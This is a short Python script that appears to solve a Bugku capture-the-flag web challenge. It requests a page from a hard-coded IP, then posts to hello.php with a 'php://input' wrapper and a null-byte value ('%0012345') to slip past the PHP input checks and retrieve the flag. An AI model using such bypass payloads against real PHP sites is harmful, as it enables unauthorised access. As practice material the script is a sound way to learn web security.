import requests

url = 'http://114.67.246.176:11437/'
response = requests.session()
result = response.get(url + '1p.html')

print(result.content.decode('utf-8'))


# getFlag
url2 = url + 'hello.php?id=a&a=php://input&b=%0012345'
data = 'bugku is a nice plateform!'
res = response.post(url2,data)

print(res.content.decode('utf-8'))
